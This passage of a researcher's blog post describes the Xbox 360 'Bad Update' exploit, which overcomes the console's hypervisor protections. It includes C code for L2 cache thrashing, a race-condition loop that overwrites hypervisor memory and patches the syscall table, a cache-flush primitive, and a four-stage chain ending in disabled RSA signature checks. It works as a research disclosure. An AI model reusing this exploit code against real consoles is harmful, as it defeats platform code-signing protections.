<p>The Xbox 360 CPU has a 1MB, 8 way associative L2 cache, meaning each of the 8 pathways can map to 128KB of cache space. One of the interesting features of the Xbox 360 is that you can lock access to sections of L2 cache (as well as the pathways) and map it to a virtual address that the GPU can access. Yes, the GPU can read directly from the CPU’s L2 cache. The idea is that instead of having the CPU write data to RAM and then the GPU read it, you can put the data in L2 cache and have the GPU read it directly. This reduces the number of memory transactions from 2 to 1. There are some other performance benefits to this feature, but what it means for us is we have a way to reduce the amount of L2 cache the CPU can use. After figuring out how to use the <code>XLockL2</code> kernel API I was able to write the following helper function:</p>



<div id="urvanov-syntax-highlighter-67c61f5b716a5894788306" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p></div>
				</td>
						<td><div><p><span>void</span><span> </span><span>LockAndThrashL2</span><span>(</span><span>int</span><span> </span><span>index</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>// Allocate a block of 256kb cachable physical memory that will be used to lock the L2 range.</span></p><p><span>	</span><span>BYTE</span><span>*</span><span> </span><span>pPhysMemoryPtr</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>XPhysicalAlloc</span><span>(</span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>,</span><span> </span><span>MAXULONG_PTR</span><span>,</span><span> </span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>,</span><span> </span><span>PAGE_READWRITE</span><span> </span><span>|</span><span> </span><span>MEM_LARGE_PAGES</span><span>)</span><span>;</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>pPhysMemoryPtr</span><span> </span><span>==</span><span> </span><span>NULL</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>DbgPrint</span><span>(</span><span>"Failed to allocate memory for L2 cache lock\n"</span><span>)</span><span>;</span></p><p><span>		</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>		</span><span>VdDisplayFatalError</span><span>(</span><span>0x12400</span><span> </span><span>|</span><span> </span><span>ERR_LOCKL2_OOM</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>// Reserve L2 cache and lock 2 of the available pathways.</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>XLockL2</span><span>(</span><span>index</span><span>,</span><span> </span><span>pPhysMemoryPtr</span><span>,</span><span> </span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>,</span><span> </span><span>XLOCKL2_LOCK_SIZE_2_WAYS</span><span>,</span><span> </span><span>0</span><span>)</span><span> </span><span>==</span><span> </span><span>FALSE</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>DbgPrint</span><span>(</span><span>"Failed to reserve L2 cache range\n"</span><span>)</span><span>;</span></p><p><span>		</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>		</span><span>VdDisplayFatalError</span><span>(</span><span>0x12400</span><span> </span><span>|</span><span> </span><span>ERR_LOCKL2_RESERVE</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>// Fill the cache with trash data.</span></p><p><span>	</span><span>memset</span><span>(</span><span>pPhysMemoryPtr</span><span>,</span><span> </span><span>0x41</span><span>,</span><span> </span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>)</span><span>;</span></p><p><span>	</span><span>// Commit the L2 cache range and prevent it from being replaced.</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>XLockL2</span><span>(</span><span>index</span><span>,</span><span> </span><span>pPhysMemoryPtr</span><span>,</span><span> </span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>,</span><span> </span><span>XLOCKL2_LOCK_SIZE_2_WAYS</span><span>,</span><span> </span><span>XLOCKL2_FLAG_SUSPEND</span><span>_</span>REPLACEMENT<span> </span><span>)</span><span> </span><span>==</span><span> </span><span>FALSE</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>DbgPrint</span><span>(</span><span>"Failed to commmit L2 cache range\n"</span><span>)</span><span>;</span></p><p><span>		</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>		</span><span>VdDisplayFatalError</span><span>(</span><span>0x12400</span><span> </span><span>|</span><span> </span><span>ERR_LOCKL2_COMMIT</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>The way this works is we first allocate a block of 256KB of physical memory that will be used to back the L2 lock. Then we reserve a portion of L2 cache that’s the same size as the physical memory allocation and fill it with data. When the CPU sees any reads and writes to this memory region it’ll redirect them to the reserved region of L2 cache. Finally, we commit the lock which prevents that region of L2 cache from being evicted. This function can be used to lock up to 512KB of L2 cache and 4 of the available pathways for an overall reduction of 50% of L2 cache. This will put a lot of pressure on the remaining L2 cache which will cause an increase in cache misses, thus increasing the likelihood of the payload thread fetching the malicious ciphertext from RAM.</p>



<p>After modifying the poc to use the <code>LockAndThrashL2</code> function I was happy to see the success rate of the race condition had gone from hitting once every 10-15 minutes down to once every 2-3 minutes. This was a huge increase and the L2 thrashing was working great. </p>



<h2>Offsetting the Race Timing</h2>



<p>The next issue to deal with was the race timing. The race was typically being won during the first half of the decompression process and since we’re targeting the last block of compressed data, I needed to find a way to shift the window of opportunity to the last half of the decompression process. Initially I tried adding a delay between when the attack thread observes the oracle ciphertext and when it starts hammering the LZX decoder structure. However, no matter how much I tweaked the length of the delay I wasn’t able to get anything consistent enough to slide the attack window to the second half of the decompression process. So I decided to take a different approach.</p>



<p>Currently the oracle data (which was 16 bytes of 00s) was based on when the XKE payload did the in-place relocation of the LZX scratch buffer to encrypted memory and zero-initialized it. After the XKE payload initializes this memory it would verify the RSA signature on the compressed input data and decrypt it, before finally calling <code>LDICreateDecompression</code> which would fill the first 16 bytes of the LZX decoder structure with data. This gave a pretty large window of opportunity to observe the ciphertext for the oracle data but led to the attack window happening too early. I decided to change the oracle data to be the first 16 bytes of the LZX decoder structure after it was initialized by <code>LDICreateDecompression</code>, in hopes it would shift the attack window to the latter half of the decompression process.</p>



<p>The first 16 bytes of the LZX decoder structure is just a header with some constant values based on the parameters provided to <code>LDICreateDecompression</code>, so I could easily change the poc to generate the ciphertext for this data. You can see this change in lines 4-6 below:</p>



<div id="urvanov-syntax-highlighter-67c61f5b716ca487197768" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					
				</td>
						<td><div><p><span>// Get the cipher text for the expected header data in the LZX decoder context. This acts as our</span></p><p><span>// "oracle" to know when to start the race attack.</span></p><p><span>memset</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span>,</span><span> </span><span>0</span><span>,</span><span> </span><span>16</span><span>)</span><span>;</span></p><p><span>*</span><span>(</span><span>ULONG</span><span>*</span><span>)</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span> </span><span>+</span><span> </span><span>0</span><span>)</span><span> </span><span>=</span><span> </span><span>0x4349444c</span><span>;</span><span>		</span><span>// signature = 'CIDL'</span></p><p><span>*</span><span>(</span><span>ULONG</span><span>*</span><span>)</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span> </span><span>+</span><span> </span><span>4</span><span>)</span><span> </span><span>=</span><span> </span><span>0x8000</span><span>;</span><span>			</span><span>// windows size = 0x8000</span></p><p><span>*</span><span>(</span><span>ULONG</span><span>*</span><span>)</span><span>(</span><span>pMemoryAddress</span><span> </span><span>+</span><span> </span><span>ScratchOffset</span><span> </span><span>+</span><span> </span><span>8</span><span>)</span><span> </span><span>=</span><span> </span><span>1</span><span>;</span><span>				</span><span>// cpu type = 1</span></p><p><span>__dcbst</span><span>(</span><span>ScratchOffset</span><span>,</span><span> </span><span>pMemoryAddress</span><span>)</span><span>;</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>With the change in place I re-ran the poc a number of times and saw that the attack window had shifted to the latter half of the decompression process, and in some cases was winning the race on the last block of data. The poc was nearing completion, however, it was about this time that a new issue had popped up.</p>



<h2>Dirty Cache</h2>



<p>When testing the previous change there were a number of iterations where the race was supposedly won on the last block but the console would crash when trying to patch the hypervisor system call table. This could only happen if the block that was written to memory wasn’t the last block in the input file and the data being written over the <code>HvxFlushUserModeTb</code> system call wasn’t our stb/blr instruction sequence.</p>



<div id="urvanov-syntax-highlighter-67c61f5b716d2631555766" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p><p>47</p><p>48</p><p>49</p><p>50</p><p>51</p><p>52</p><p>53</p><p>54</p><p>55</p><p>56</p></div>
				</td>
						<td><div><p><span>DWORD </span><span>RunUpdatePayloadThreadProc</span><span>(</span><span>THREAD_ARGS</span><span>*</span><span> </span><span>pArgs</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>	</span><span>// Get the cipher text at the location we want to overwrite and at an offset that is &gt; the size of block 14. This allows</span></p><p><span>	</span><span>// us to determine when we win the race on block 14 (smallest block in the file) vs any other block.</span></p><p><span>	</span><span>DWORD</span><span>*</span><span> </span><span>pCipherTextPtr1</span><span> </span><span>=</span><span> </span><span>(</span><span>DWORD</span><span>*</span><span>)</span><span>(</span><span>0xA0030000</span><span> </span><span>+</span><span> </span><span>HV_SEG3_OVERWRITE_OFFSET</span><span>)</span><span>;</span></p><p><span>	</span><span>DWORD</span><span>*</span><span> </span><span>pCipherTextPtr2</span><span> </span><span>=</span><span> </span><span>(</span><span>DWORD</span><span>*</span><span>)</span><span>(</span><span>0xA0030000</span><span> </span><span>+</span><span> </span><span>(</span><span>HV_SEG3_OVERWRITE_OFFSET</span><span> </span><span>-</span><span> </span><span>BLOCK_14_TARGET_OFFSET</span><span>)</span><span> </span><span>+</span><span> </span><span>BLOCK_14_SIZE</span><span> </span><span>+</span><span> </span><span>0x80</span><span>)</span><span>;</span></p><p><span>	</span><span>DWORD </span><span>cipherValue1</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr1</span><span>;</span></p><p><span>	</span><span>DWORD </span><span>cipherValue2</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr2</span><span>;</span></p><p><span>	</span><span>// Loop and hammer the payload until we hopefully get code exec.</span></p><p><span>	</span><span>while</span><span> </span><span>(</span><span>true</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>.</span><span>.</span><span>.</span></p><p><span>		</span><span>// Execute the payload.</span></p><p><span>		</span><span>DWORD </span><span>result</span><span> </span><span>=</span><span> </span><span>HvxKeysExecute</span><span>(</span><span>pArgs</span><span>-&gt;</span><span>PayloadPhys</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>PayloadSize</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>UpdateDataPhys</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>UpdateDataSize</span><span>,</span><span> </span><span>NULL</span><span>,</span><span> </span><span>NULL</span><span>)</span><span>;</span></p><p><span>		</span><span>// Flush cache on the cipher text pointers.</span></p><p><span>		</span><span>__dcbf</span><span>(</span><span>0</span><span>,</span><span> </span><span>pCipherTextPtr1</span><span>)</span><span>;</span></p><p><span>		</span><span>__dcbf</span><span>(</span><span>0</span><span>,</span><span> </span><span>pCipherTextPtr2</span><span>)</span><span>;</span></p><p><span>		</span><span>// Check if we got a block overwrite and if it appears to be block 14.</span></p><p><span>		</span><span>DWORD </span><span>test1</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr1</span><span>;</span></p><p><span>		</span><span>if</span><span> </span><span>(</span><span>cipherValue1</span><span> </span><span>!=</span><span> </span><span>test1</span><span>)</span></p><p><span>		</span><span>{</span></p><p><span>			</span><span>// We got a block overwrite, check if it was block 14.</span></p><p><span>			</span><span>DWORD </span><span>test2</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr2</span><span>;</span></p><p><span>			</span><span>if</span><span> </span><span>(</span><span>cipherValue2</span><span> </span><span>==</span><span> </span><span>test2</span><span>)</span></p><p><span>			</span><span>{</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>"Block 14 overwrite hit!\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>// Overwrite the syscall function pointer for HvxPostOutput to point to a gadget that will jump to an arbitrary address.</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Patching hv syscall table\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>HvWriteULONG</span><span>(</span><span>HV_SYSCALL_POST_OUTPUT_ADDRESS</span><span>,</span><span> </span><span>HV_CALL_R4_GADGET_ADDRESS</span><span>)</span><span>;</span></p><p><span>				</span><span>// Try to execute our shell code which will restore the data we trashed in the last hypervisor segment and patch out</span></p><p><span>				</span><span>// the RSA signature checks on executable files.</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Running payload\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxPostOutputExploit</span><span>(</span><span>0</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>ShellCodePhysAddress</span><span>)</span><span>;</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Payload returned 0x%08x\n"</span><span>,</span><span> </span><span>result</span><span>)</span><span>;</span></p><p><span>				</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>			</span><span>}</span></p><p><span>			</span><span>else</span></p><p><span>			</span><span>{</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>"Race hit: 0x%08x\n"</span><span>,</span><span> </span><span>test1</span><span>)</span><span>;</span></p><p><span>			</span><span>}</span></p><p><span>			</span><span>// Save the latest block hit values.</span></p><p><span>			</span><span>cipherValue1</span><span> </span><span>=</span><span> </span><span>test1</span><span>;</span></p><p><span>			</span><span>cipherValue2</span><span> </span><span>=</span><span> </span><span>test2</span><span>;</span></p><p><span>		</span><span>}</span></p><p><span>	</span><span>}</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>After doing some introspection on my hacked console I was able to confirm that the block being written wasn’t the last block in the input file and that the ciphertext read from the <code>pCipherTextPtr2</code> pointer was stale. This basically meant that the latter portion of data being written to hypervisor memory was getting stuck in L2 cache and not being committed to RAM where it could be observed from kernel mode. This wasn’t a huge issue, it simply meant I had to find a cache flush primitive I could use to get this data committed to RAM.</p>



<h3>Finding a Cache Flush Primitive</h3>



<p>Finding a cache flush primitive isn’t too difficult, you mainly need to find a function that will process some data and cause what’s currently in L2 cache to age out. Any hypervisor function that meets the following criteria will work:</p>



<ul>
<li>Runs in hypervisor context. Kernel mode cannot flush cache lines that were allocated by hypervisor mode.</li>



<li>Runs with caching enabled. The hypervisor normally runs with caching disabled so we’ll need to find a function that enables caching before processing the data. Any function that operates on data using the encrypted pathway will do this.</li>



<li>Touches as much data as possible while also performing as little validation as possible.</li>
</ul>



<p>After looking through all the hypervisor functions that operate on encrypted memory I came across a system call called <code>HvxRevokeUpdate</code> that met the above criteria. This function is used to encrypt a console certificate revocation list using a per-console key. These revocation lists are used to blacklist console certificates that have been considered “compromised”. For example, if someone hacked their console and used their console certificate to sign malicious game saves (for hacking the console or cheating online), Microsoft could blacklist the console certificate used to sign them by adding it to the revocation list and distributing it over Xbox Live or in system updates. After it’s been revoked any game save signed by that console certificate will show up as “corrupted” and can’t be loaded.</p>



<p>For us this function is a great cache flush primitive because it operates on an input buffer up to 0x20000 bytes large in encrypted memory and performs no validation on the input data. We simply provide it an empty input buffer and once the hypervisor enables caching and touches this data from the encrypted pathway it’ll cause old data in L2 cache to be evicted. After including the cache flush primitive into the exploit poc I ended up with the following:</p>



<div id="urvanov-syntax-highlighter-67c61f5b716d7759369431" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p><p>47</p><p>48</p><p>49</p><p>50</p><p>51</p><p>52</p><p>53</p><p>54</p><p>55</p><p>56</p><p>57</p><p>58</p><p>59</p><p>60</p><p>61</p><p>62</p><p>63</p><p>64</p></div>
				</td>
						<td><div><p><span>DWORD </span><span>RunUpdatePayloadThreadProc</span><span>(</span><span>THREAD_ARGS</span><span>*</span><span> </span><span>pArgs</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>// Allocate a scratch buffer to help with flushing L2 cache in hypervisor context.</span></p><p><span>	</span><span>BYTE</span><span>*</span><span> </span><span>pCacheFlushBuffer</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>XPhysicalAlloc</span><span>(</span><span>0x20000</span><span>,</span><span> </span><span>MAXULONG_PTR</span><span>,</span><span> </span><span>0x10000</span><span>,</span><span> </span><span>PAGE_READWRITE</span><span> </span><span>|</span><span> </span><span>MEM_LARGE_PAGES</span><span>)</span><span>;</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>pCacheFlushBuffer</span><span> </span><span>==</span><span> </span><span>NULL</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>DbgPrint</span><span>(</span><span>"Failed to allocate memory for cache flush buffer\n"</span><span>)</span><span>;</span></p><p><span>		</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>		</span><span>VdDisplayFatalError</span><span>(</span><span>0x12400</span><span> </span><span>|</span><span> </span><span>ERR_CACHE_FLUSH_BUFFER_OOM</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>ULONG </span><span>CacheFlushBufferPhys</span><span> </span><span>=</span><span> </span><span>MmGetPhysicalAddress</span><span>(</span><span>pCacheFlushBuffer</span><span>)</span><span>;</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>	</span><span>// Loop and hammer the payload until we hopefully get code exec.</span></p><p><span>	</span><span>while</span><span> </span><span>(</span><span>true</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>.</span><span>.</span><span>.</span></p><p><span>		</span><span>// Execute the payload.</span></p><p><span>		</span><span>DWORD </span><span>result</span><span> </span><span>=</span><span> </span><span>HvxKeysExecute</span><span>(</span><span>pArgs</span><span>-&gt;</span><span>PayloadPhys</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>PayloadSize</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>UpdateDataPhys</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>UpdateDataSize</span><span>,</span><span> </span><span>NULL</span><span>,</span><span> </span><span>NULL</span><span>)</span><span>;</span></p><p><span>		</span><span>// Flush cache on the cipher text pointers.</span></p><p><span>		</span><span>__dcbf</span><span>(</span><span>0</span><span>,</span><span> </span><span>pCipherTextPtr1</span><span>)</span><span>;</span></p><p><span>		</span><span>// Check if we got a block overwrite and if it appears to be block 14.</span></p><p><span>		</span><span>DWORD </span><span>test1</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr1</span><span>;</span></p><p><span>		</span><span>if</span><span> </span><span>(</span><span>cipherValue1</span><span> </span><span>!=</span><span> </span><span>test1</span><span>)</span></p><p><span>		</span><span>{</span></p><p><span>			</span><span>// Flush cache on the secondary cipher text pointer. This one MUST be thorough or else we risk fetching stale data</span></p><p><span>			</span><span>// and trying to execute the post-block-write part of the exploit which will cause the console to hang.</span></p><p><span>			</span><span>HvxRevokeUpdate</span><span>(</span><span>CacheFlushBufferPhys</span><span>,</span><span> </span><span>0x20000</span><span>,</span><span> </span><span>0</span><span>)</span><span>;</span></p><p><span>			</span><span>__dcbf</span><span>(</span><span>0</span><span>,</span><span> </span><span>pCipherTextPtr2</span><span>)</span><span>;</span></p><p><span>			</span><span>// We got a block overwrite, check if it was block 14.</span></p><p><span>			</span><span>DWORD </span><span>test2</span><span> </span><span>=</span><span> </span><span>*</span><span>pCipherTextPtr2</span><span>;</span></p><p><span>			</span><span>if</span><span> </span><span>(</span><span>cipherValue2</span><span> </span><span>==</span><span> </span><span>test2</span><span>)</span></p><p><span>			</span><span>{</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>"Block 14 overwrite hit!\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>// Overwrite the syscall function pointer for HvxPostOutput to point to a gadget that will jump to an arbitrary address.</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Patching hv syscall table\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>HvWriteULONG</span><span>(</span><span>HV_SYSCALL_POST_OUTPUT_ADDRESS</span><span>,</span><span> </span><span>HV_CALL_R4_GADGET_ADDRESS</span><span>)</span><span>;</span></p><p><span>				</span><span>// Try to execute our shell code which will restore the data we trashed in the last hypervisor segment and patch out</span></p><p><span>				</span><span>// the RSA signature checks on executable files.</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Running payload\n"</span><span>)</span><span>;</span></p><p><span>				</span><span>result</span><span> </span><span>=</span><span> </span><span>HvxPostOutputExploit</span><span>(</span><span>0</span><span>,</span><span> </span><span>pArgs</span><span>-&gt;</span><span>ShellCodePhysAddress</span><span>)</span><span>;</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>" * Payload returned 0x%08x\n"</span><span>,</span><span> </span><span>result</span><span>)</span><span>;</span></p><p><span>				</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>			</span><span>}</span></p><p><span>			</span><span>else</span></p><p><span>			</span><span>{</span></p><p><span>				</span><span>DbgPrint</span><span>(</span><span>"Race hit: 0x%08x\n"</span><span>,</span><span> </span><span>test1</span><span>)</span><span>;</span></p><p><span>			</span><span>}</span></p><p><span>			</span><span>// Save the latest block hit values.</span></p><p><span>			</span><span>cipherValue1</span><span> </span><span>=</span><span> </span><span>test1</span><span>;</span></p><p><span>			</span><span>cipherValue2</span><span> </span><span>=</span><span> </span><span>test2</span><span>;</span></p><p><span>		</span><span>}</span></p><p><span>	</span><span>}</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>Running the updated poc showed the cache flush primitive was working and the console was no longer crashing on false positives due to stale data in RAM. The only thing left to do now was assemble all the pieces of this exploit into a single chain that I would trigger using my favorite game exploit, Tony Hawk’s Pro Strcpy.</p>



<h2>Introducing the Xbox 360 Bad Update Exploit</h2>



<p>To turn this into an end-to-end exploit and get hypervisor code execution I’d use my <a href="https://icode4.coffee/?p=954" data-type="post" data-id="954">Tony Hawk’s Pro Strcpy</a> bug as an entry point and combine it with the techniques I developed for attacking this bootloader update XKE payload. Putting all of the pieces of the exploit together the full exploit chain would look like so:</p>



<ol>
<li>Stage 1
<ul>
<li>Using a modified game save file I would trigger the gap name strcpy bug in Tony Hawk’s American Wasteland (you can read about this bug in the <a href="https://icode4.coffee/?p=954" data-type="post" data-id="954">Tony Hawk’s Pro Strcpy</a> post) and get a ROP chain executing in kernel mode. This ROP chain would load a much larger ROP chain (stage 2) from a file on the HDD and pivot execution to it.</li>
</ul>
</li>



<li>Stage 2
<ul>
<li>The larger ROP chain would perform the operations needed to get arbitrary kernel mode code execution, and load stage 3 from a file on the HDD into the region of executable kernel memory.</li>
</ul>
</li>



<li>Stage 3
<ul>
<li>Stage 3 is the C code I wrote to run and attack the bootloader update XKE payload. This will perform the attack on the LZX decompression process to try and overwrite some hypervisor code and create an arbitrary write primitive. Using the arbitrary write primitive we’ll further modify hypervisor memory to get hypervisor code execution and run the stage 4 code in hypervisor mode.</li>
</ul>
</li>



<li>Stage 4
<ul>
<li>Stage 4 is assembly code I wrote that will undo all the memory corruption done to the hypervisor in stage 3 so it’s in a clean and stable state. After that it’ll patch out the RSA signature checks the hypervisor does on executable code so that unsigned executables can be run on the console.</li>



<li>Once complete stage 4 will return back to kernel mode and run an unsigned executable from the HDD thus proving the exploit worked.</li>
</ul>
</li>
</ol>



<p>While all the major pieces were already proven to work I still needed to chain them all together into a top-down exploit.</p>



<h2>A ROP Chain for the Record Books</h2>



<p>The technique I developed for getting arbitrary kernel mode code execution was done in C code that I could deploy and run on my hacked console. This code would need to be recreated in a ROP chain, and while the code itself wasn’t very complex doing it all in ROP wasn’t easy. It took about a week to rewrite the C code in ROP and the final chain consisted of 20-30 unique ROP gadgets and just over 28,000 links in the chain. I wrote many parts of the chain in reusable macros and split it across several source files to simplify the process, but even then the complexity of the chain is quite high.</p>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">Almost out of ROP chain hell… Currently have 20 unique gadgets and 27,716 links in the chain. I implemented common functionality in macros which makes writing more complex aspects of the chain easier. Another day or so and I can move on to the third stage of the exploit (in C) <a href="https://t.co/uNpLKtlMGP">pic.twitter.com/uNpLKtlMGP</a></p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1838187355037167943?ref_src=twsrc%5Etfw">September 23, 2024</a></blockquote>
</div></figure>



<h2>The Grand Finale</h2>



<p>With everything in place there was one last thing to do. If you read my <a href="https://icode4.coffee/?p=954" data-type="post" data-id="954">Tony Hawk’s Pro Strcpy</a> blog post you might remember I used a homebrew <a href="https://www.youtube.com/watch?v=2yJgwwDcgV8">nyan cat</a> executable to test my exploits. It has since become somewhat of a signature for my exploits and while I had a version of this for the Xbox 360 ready to go, I decided to give it a small upgrade. After copying all the exploit files to a USB stick I booted up Tony Hawk’s American Wasteland, loaded my hacked game save, and waited. I knew from test runs on my hacked console that the exploit had a low success rate (around 35%) and could take upwards of 30 minutes to trigger, but I was ecstatic when it triggered on the first attempt in only a few minutes time. I now had an end-to-end hypervisor exploit that worked on the latest system software (version 17559) and could be triggered using software only methods.</p>



<figure><p>
<iframe loading="lazy" title="Xbox 360 Bad Update Exploit Demo" width="470" height="264" src="https://www.youtube.com/embed/WgmrW0Pfgl4?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">As of today I have a fully working software only hypervisor exploit for the latest xbox 360 retail dashboard 17559 (should work on almost any software version though). Here's what you need to know…</p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1847497275289063676?ref_src=twsrc%5Etfw">October 19, 2024</a></blockquote>
</div></figure>



<p>Full source code and files for the exploit can be found on GitHub: <a href="https://github.com/grimdoomer/Xbox360BadUpdate" target="_blank" rel="noreferrer noopener">Xbox360BadUpdate</a>.</p>



<h2>Exploit F.A.Q.</h2>



<p>There are a couple questions I know people will be asking about the current state of the exploit, if a softmod is available, and how it compares to things like the RGH hack. I’ve provided answers to a few of these here.</p>



<ul>
<li><strong>What Xbox 360 software/kernel version does this exploit work on?</strong>
<ul>
<li>The exploit works on all software versions up to/through 17559, though there’s some version specific information that would need to be updated for any version other than 17559. At the time of writing this post I have reported the vulnerability to Microsoft but I don’t know if it will be patched in a future software update or not.</li>
</ul>
</li>



<li><strong>Does this mean a “softmod” is now available?</strong>
<ul>
<li>While the exploit is software only (no additional hardware or opening of the console required) it’s not persistent. You’ll need to rerun the exploit every time you turn the console on. Once the exploit runs your console will be in a hacked state until it’s rebooted/powered off. It works much the same as a tethered iOS jailbreak.</li>
</ul>
</li>



<li><strong>Can this be turned into a softmod/made persistent?</strong>
<ul>
<li>It’s theoretically possible to turn this into a persistent “softmod” but it wouldn’t be an ideal experience. The Xbox 360 boot chain is well protected and the only viable way to trigger the exploit on boot would be by finding a bug in the Xbox 360 dashboard, which may require additional input to trigger (ex: wait for dashboard to load, navigate to games list, scroll down, exploit triggers). <p>On top of this the Bad Update exploit can take up to 20 minutes to trigger and only has a ~35% success rate. Imagine every time you turn your console on, the dashboard loads, you have to navigate through a menu or two, then wait 20 minutes for the exploit to hopefully trigger, and if it doesn’t you have to reboot the console and start over until it works. Not a very good experience is it?</p></li>
</ul>
</li>



<li><strong>Why does the exploit take so long to trigger/can it be made faster/more reliable?</strong>
<ul>
<li>The exploit takes a while to trigger because it has to exploit a race condition under very specific circumstances. It may be possible to improve the timing/reliability but I don’t think it’ll ever be good enough to try and turn into a persistent hack.</li>
</ul>
</li>



<li><strong>Should I use this instead of the RGH hack?</strong>
<ul>
